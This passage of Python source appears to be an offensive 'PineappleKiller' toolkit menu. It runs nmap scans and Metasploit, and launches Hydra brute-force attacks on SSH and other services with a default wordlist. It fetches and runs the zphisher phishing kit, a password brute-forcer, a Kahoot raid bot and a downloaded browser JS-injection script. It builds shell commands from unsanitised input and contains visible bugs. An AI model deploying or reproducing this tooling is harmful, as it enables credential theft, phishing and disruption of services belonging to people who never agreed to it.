                    pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                    if str(pineapplekilleroption) == "00":
                        print("")
                    if str(pineapplekilleroption) == "01":
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller  \x1b[0;36mHost\x1b[0;31m> \x1b[0;32m")
                        pineapplekillersweep = input("\x1b[0;31mPineappleKiller  \x1b[0;36mSweep\x1b[0;31m> \x1b[0;32m")
                        pineapplekillernmapsweepcommand = "nmap -sP "+pineapplekillerhost+"/"+pineapplekillersweep
                        try:
                            os.system(pineapplekillernmapsweepcommand)
                            time.sleep(5)
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                    if str(pineapplekilleroption) == "02":
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller  Host> \x1b[0;32m")
                        pineapplekillerport = input("\x1b[0;31mPineappleKiller  Port> \x1b[0;32m")
                        pineapplekillernmapportcommand = "nmap -p "+pineapplekillerhost+" -sT "+pineapplekillerhost
                        try:
                            os.system(pineapplekillernmapportcommand)
                            time.sleep(5)
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                    if str(pineapplekilleroption) == "03":
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller  \x1b[0;36mHOST\x1b[0;31m> \x1b[0;32m")
                        pineapplekillernmaphostcommand = "sudo nmap -sS "+pineapplekillerhost
                        try:
                            os.system(pineapplekillernmaphostcommand)
                            time.sleep(5)
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                    if str(pineapplekilleroption) == "04":
                        pineapplekillerhost = input("\x1b[0;31mPineappleKiller  \x1b[0;36mHOST\x1b[0;31m> \x1b[0;32m")
                        pineapplekillernmapsohostcommand = "nmap -A -T4 "+pineapplekillerhost
                        try:
                            os.system(pineapplekillernmapsohostcommand)
                            time.sleep(5)
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
            if str(pineapplekilleroption) == "07":
                print("Coming soon")
                time.sleep(2)

            if str(pineapplekilleroption) == "08":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("\x1b[0;36m[Metasploit Framework]\x1b[0;32m")
                try:
                    os.system("sudo msfdb init && msfconsole")
                except:
                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

            if str(pineapplekilleroption) == "09":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""[File Modifier]

\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mPineappleDevGUI
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("\x1b[0;31m[PineappleDev File Modifier \x1b[0;32mGUI]\x1b[0;32m")
                    try:
                        p_filemodifiergui()
                    except:
                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

            if str(pineapplekilleroption) == "10":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""[Brute Force]

\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mHydra
\x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mPythonBruteForce [by x04000]
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    while(True):
                        pineapplekillerdefaultwordlist = "pineapplekiller/pineapplekillerwordlist"
                        pineapplekillerusernamessh = ""
                        pineapplekillersettedusernamessh = 0
                        pineapplekillerwordlist = ""
                        pineapplekillersettedwordlist = 0
                        pineapplekillerhost = ""
                        pineapplekillersettedhost = 0
                        pineapplekillerprocediment = ""
                        pineapplekillersettedprocediment = 0
                        pineapplekillerclear()
                        pineapplekillerlogo()
                        print("""\x1b[0;31m[\x1b[0;36mHydra\x1b[0;31m]

    \x1b[0;36mhost              \x1b[0;31m- \x1b[0;32mHost
    \x1b[0;36musername          \x1b[0;31m- \x1b[0;32mUsername (SSH)
    \x1b[0;36mwordlist          \x1b[0;31m- \x1b[0;32mWordlist (pineapplekiller have a default wordlist)
    \x1b[0;36mprocediment       \x1b[0;31m- \x1b[0;32mProcediment
    \x1b[0;36mrun               \x1b[0;31m- \x1b[0;32mRun Hydra
                        """)
                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        print("")
                        if str(pineapplekilleroption) == "run":
                            if pineapplekillersettedhost == 1:
                                pineapplekillerhydraoptions = pineapplekillersettedusernamessh+pineapplekillersettedwordlist+pineapplekillersettedprocediment
                                pineapplekillerclear()
                                pineapplekillerlogo()
                                print("[\x1b[0;36mPineappleKiller Hydra \x1b[0;31mAttacking]\x1b[0;36m")
                                if pineapplekillerhydraoptions == 0:
                                    try:
                                        pineapplekillerhydracommand = "hydra -P "+pineapplekillerdefaultwordlist+" "+pineapplekillerhost
                                        os.system(pineapplekillerhydracommand)
                                        time.sleep(5)
                                    except:
                                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                                if pineapplekillerhydraoptions == 4:
                                    try:
                                        pineapplekillerhydracommand = "hydra -l "+pineapplekillerusernamessh+" -P "+pineapplekillerdefaultwordlist+" "+pineapplekillerhost+" -t 4 ssh"
                                        os.system(pineapplekillerhydracommand)
                                        time.sleep(5)
                                    except:
                                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                                if pineapplekillerhydraoptions == 5:
                                    try:
                                        pineapplekillerhydracommand = "hydra -P "+pineapplekillerwordlist+" "+pineapplekillerhost
                                        os.system(pineapplekillerhydracommand)
                                        time.sleep(5)
                                    except:
                                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                                if pineapplekillerhydraoptions == 6:
                                    try:
                                        pineapplekillerhydracommand = "hydra -P "+pineapplekillerdefaultwordlist+" "+pineapplekillerhost+" -t 4 "+pineapplekillerprocediment
                                        os.system(pineapplekillerhydracommand)
                                        time.sleep(5)
                                    except:
                                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                                if pineapplekillerhydraoptions == 9:
                                    try:
                                        pineapplekillerhydracommand = "hydra -l "+pineapplekillerusernamessh+" -P "+pineapplekillerwordlist+" "+pineapplekillerhost+" -t 4 "+pineapplekillerprocediment
                                        os.system(pineapplekillerhydracommand)
                                        time.sleep(5)
                                    except:
                                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                                if pineapplekillerhydraoptions == 10:
                                    try:
                                        pineapplekillerhydracommand = "hydra -l "+pineapplekillerusernamessh+" -P "+pineapplekillerdefaultwordlist+" "+pineapplekillerhost+" -t 4 "+pineapplekillerprocediment
                                        os.system(pineapplekillerhydracommand)
                                        time.sleep(5)
                                    except:
                                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                                if pineapplekillerhydraoptions == 11:
                                    try:
                                        pineapplekillerhydracommand = "hydra -P "+pineapplekillerwordlist+" "+pineapplekillerhost+" -t 4 "+pineapplekillerprocediment
                                        os.system(pineapplekillerhydracommand)
                                        time.sleep(5)
                                    except:
                                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            else:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Undefined target!")
                        if str(pineapplekilleroption) == "host":
                            print("[Host]")
                            pineapplekillerhost = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            pineapplekillersettedhost = 1
                            print("")
                            print("Target set to: "+pineapplekillerhost)
                            time.sleep(2)
                        if str(pineapplekilleroption) == "username":
                            print("[Username (SSH)]")
                            pineapplekillerusernamessh = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            pineapplekillersettedusernamessh = 4
                        if str(pineapplekilleroption) == "wordlist":
                            print("[Wordlist]")
                            pineapplekillerwordlist = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            pineapplekillersettedwordlist = 5
                        if str(pineapplekilleroption) == "procediment":
                            print("[Procediment]")
                            pineapplekillerprocediment = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            pineapplekillersettedprocediment = 6
                if str(pineapplekilleroption) == "02":
                    print("Checking PythonBruteForce installation...")
                    def pineapplekillercheckpythonbruteforce():
                        def pineapplekillerpythonbruteforceinst():
                            print("The PythonBruteForce is not installed!")
                            print("Do you want to install them? [Y/n]")
                            pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            if str(pineapplekilleroption) == "Y":
                                if os.path.isdir("PythonBruteForce"):
                                    os.system("sudo rm -rfv PythonBruteForce")
                                print("")
                                print("Downloading PythonBruteForce > Via Github")
                                try:
                                    os.system("git clone https://github.com/x04000/PythonBruteForce")
                                    time.sleep(2)
                                    return pineapplekillercheckpythonbruteforce()
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            else:
                                print("")
                        if os.path.isdir("zphisher"):
                            if os.path.isfile("PythonBruteForce/BruteForceHash.py"):
                                pineapplekillerclear()
                                pineapplekillerlogo()
                                try:
                                    while(True):
                                        pineapplekillerclear()
                                        pineapplekillerlogo()
                                        print("""[PythonBruteForce]

    \x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
    \x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mBruteForce
    \x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mBruteForceHash
    \x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mToHash

                                        """)
                                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                        if str(pineapplekilleroption) == "00":
                                            break
                                        if str(pineapplekilleroption) == "01":
                                            pineapplekillerclear()
                                            pineapplekillerlogo()
                                            os.system("cd PythonBruteForce && python3 BruteForce.py && cd ..")
                                        if str(pineapplekilleroption) == "02":
                                            pineapplekillerclear()
                                            pineapplekillerlogo()
                                            os.system("cd PythonBruteForce && python3 BruteForceHash.py && cd ..")
                                        if str(pineapplekilleroption) == "03":
                                            pineapplekillerclear()
                                            pineapplekillerlogo()
                                            os.system("cd PythonBruteForce && python3 ToHash.py && cd ..")
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            else:
                                pineapplekillerpythonbruteforceinst()
                        else:
                            pineapplekillerpythonbruteforceinst()
                    pineapplekillercheckpythonbruteforce()
            
            if pineapplekilleroption == "11":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("Checking zphisher installation...")
                def pineapplekillercheckzphisher():
                    def pineapplekillerzphisherinst():
                        print("The zphisher is not installed!")
                        print("Do you want to install them? [Y/n]")
                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        if str(pineapplekilleroption) == "Y":
                            if os.path.isdir("zphisher"):
                                os.system("sudo rm -rfv zphisher")
                            print("")
                            print("Downloading zphisher > Via Github")
                            try:
                                os.system("git clone https://github.com/htr-tech/zphisher")
                                time.sleep(2)
                                return pineapplekillercheckzphisher()
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            print("")
                    if os.path.isdir("zphisher"):
                        if os.path.isfile("zphisher/zphisher.sh"):
                            pineapplekillerclear()
                            pineapplekillerlogo()
                            try:
                                os.system("cd zphisher && bash zphisher.sh && cd ..")
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            pineapplekillerzphisherinst()
                    else:
                        pineapplekillerzphisherinst()
                pineapplekillercheckzphisher()

            if pineapplekilleroption == "12":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("Checking sherlock installation...")
                def pineapplekillerchecksherlock():
                    def pineapplekillersherlockinst():
                        print("The sherlock is not installed!")
                        print("Do you want to install them? [Y/n]")
                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        if str(pineapplekilleroption) == "Y":
                            if os.path.isdir("sherlock"):
                                os.system("sudo rm -rfv sherlock")
                            print("")
                            print("Downloading sherlock > Via Github")
                            try:
                                os.system("git clone https://github.com/sherlock-project/sherlock")
                                os.system("cd sherlock && python3 -m pip install -r requirements.txt && cd ..")
                                time.sleep(2)
                                return pineapplekillerchecksherlock()
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            print("")
                    if os.path.isdir("sherlock"):
                        if os.path.isfile("sherlock/sherlock/sherlock.py"):
                            pineapplekillerclear()
                            pineapplekillerlogo()
                            pineapplekillerusername = input("\x1b[0;31mPineappleKiller  \x1b[0;36mUsername\x1b[0;31m> \x1b[0;32m")
                            try:
                                os.system("cd sherlock && cd sherlock && python3 sherlock.py "+pineapplekillerusername+" && cd .. && cd ..")
                                time.sleep(5)
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            pineapplekillersherlockinst()
                    else:
                        pineapplekillersherlockinst()
                pineapplekillerchecksherlock()
            if pineapplekilleroption == "13":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("Checking KBOT installation...")
                def pineapplekillercheckKBOT():
                    def pineapplekillerKBOTinst():
                        print("The KBOT is not installed!")
                        print("Do you want to install them? [Y/n]")
                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        if str(pineapplekilleroption) == "Y":
                            if os.path.isdir("Kahoot-Raider-KBOT"):
                                os.system("sudo rm -rfv Kahoot-Raider-KBOT")
                            print("")
                            print("Downloading KBOT > Via Github")
                            try:
                                os.system("git clone https://github.com/x04000/Kahoot-Raider-KBOT")
                                return pineapplekillercheckKBOT()
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            print("")
                    if os.path.isdir("Kahoot-Raider-KBOT"):
                        if os.path.isfile("Kahoot-Raider-KBOT/kbot"):
                            pineapplekillerclear()
                            pineapplekillerlogo()
                            pineapplekillerkahootoption = 0
                            print("""[Kahoot Tools]

\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mKahoot-Answer-Bot
\x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mKahoot-Raider (GUI)

                            """)
                            pineapplekilleroption = str(input("\x1b[0;31mPineappleKiller > \x1b[0;32m"))
                            if pineapplekilleroption == "00":
                                print("")
                            elif pineapplekilleroption == "01":
                                pineapplekillerkahootoption = 1
                            elif pineapplekilleroption == "02":
                                pineapplekillerkahootoption = 2
                            else:
                                print("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Invalid option!")
                                time.sleep(2)
                            try:
                                pineapplekillerkahootpin = str(input("\x1b[0;31mPineappleKiller  \x1b[0;36mPIN\x1b[0;31m> \x1b[0;32m"))
                                pineapplekillerkahootquizid = str(input("\x1b[0;31mPineappleKiller  \x1b[0;36mQuizID\x1b[0;31m> \x1b[0;32m"))
                                if pineapplekillerkahootoption == 1:
                                    pineapplekillerkahootname = str(input("\x1b[0;31mPineappleKiller  \x1b[0;36mBot Name\x1b[0;31m> \x1b[0;32m"))
                                if pineapplekillerkahootoption == 2:
                                    pineapplekillerkahootbots = int(input("\x1b[0;31mPineappleKiller  \x1b[0;36mBots\x1b[0;31m> \x1b[0;32m"))
                                slowprint("\x1b[0;35mLoading KBOT...")
                                nhprogressbar2()
                                time.sleep(2)
                                if pineapplekilleroption == 1:
                                    os.system("cd Kahoot-Raider-KBOT && python3 kbot -p "+pineapplekillerkahootpin+" -n "+pineapplekillerkahootname+" -i "+pineapplekillerkahootquizid+" && cd ..")
                                if pineapplekilleroption == 2:
                                    pineapplekillerkahootbotsin = 0
                                    while(True):
                                        if pineapplekillerkahootbotsin == pineapplekillerkahootbots:
                                            break
                                        else:
                                            pineapplekillerkahootbotsin = pineapplekillerkahootbotsin + 1
                                            print("Bot "+pineapplekillerkahootbotsin+" joined!")
                                            pineapplekillerkahootwatermark = "PineappleKiller !"+''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
                                            try:
                                                import tkinter

                                                pin = tkinter.Tk()
                                                pin.geometry("400x300")
                                                pin.title("PineappleKiller Kahoot Tools")
                                                pin.configure(bg="black")

                                                text1 = tkinter.Label(pin, text = "PineapplKiller Kahoot Tools", bg="red", fg="white")
                                                text1.pack(fill = tkinter.X)
                                                text2 = tkinter.Label(pin, text = "", bg="black", fg="white")
                                                text2.pack(fill = tkinter.X)
                                                text3 = tkinter.Label(pin, text = "Hey! This window is a bot!", bg="black", fg="white")
                                                text3.pack(fill = tkinter.X)

                                                os.system("cd Kahoot-Raider-KBOT && python3 kbot -p "+pineapplekillerkahootpin+" -n "+pineapplekillerkahootwatermark+" -i "+pineapplekillerkahootquizid+" && cd ..")

                                                pin.mainloop()
                                            except KeyboardInterrupt:
                                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                                                break
                                            except:
                                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Fatal Error ocurred during the Raid")
                                                break
                                        time.sleep(1)
                            except:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                        else:
                            pineapplekillerKBOTinst()
                    else:
                        pineapplekillerKBOTinst()
                pineapplekillercheckKBOT()
            if pineapplekilleroption == "14":
                if os.path.isfile("JS-InjectionPineappleKillerCode"):
                    os.system("rm JS-InjectionPineappleKillerCode")
                os.system("wget -O JS-InjectionPineappleKillerCode https://raw.githubusercontent.com/x04000/JS-InjectionPineappleKiller/main/InjectionPineappleKiller.js")
                slowprint("The code has been downloaded in the file JS-InjectionPineappleKillerCode | Just put the code in your Browser Terminal")
                time.sleep(5)

    except:
        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
pineapplekillermenu()